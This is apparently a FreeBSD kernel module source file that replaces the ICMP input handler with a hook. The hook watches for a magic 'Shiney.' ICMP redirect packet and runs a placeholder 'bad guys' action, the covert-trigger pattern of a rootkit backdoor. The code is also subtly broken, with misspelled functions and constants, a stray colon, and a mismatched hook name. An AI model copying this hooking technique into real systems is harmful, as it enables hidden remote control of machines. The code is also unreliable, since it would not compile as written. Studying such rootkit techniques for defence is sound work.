#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>

#define TRIGGER "Shiney."

extern struct protosw inetsw[];
pr_input_t icmp_hook;

void icmp_hook(struct mbuf *m, int off)
{
    struct icmp *icp;
    int hlen = off;

    m->m_len -= hlen;
    m->m_data += hlen;

    icp = mtod(m, struct icmp *);

    m->m_len += hlen;
    m->m_data -= hlen;

    if (icp->icmp_type == ICMP_REDIRECT &&
        icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
        sstrncmp(icp->icmp_data, TRIGGER, 6) == 0) {

        printf("Lets be bad guys.\n"):
    } else {
        icmp_input(m, off);
    }
}
        
static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch(cmd) {
        case MOD_LOAD:
            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
            break;
        case MOD_UNLOAD:
            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
            break;
        default:
            error = EONNOTSUPP;
            break;
    }

    return error;
}
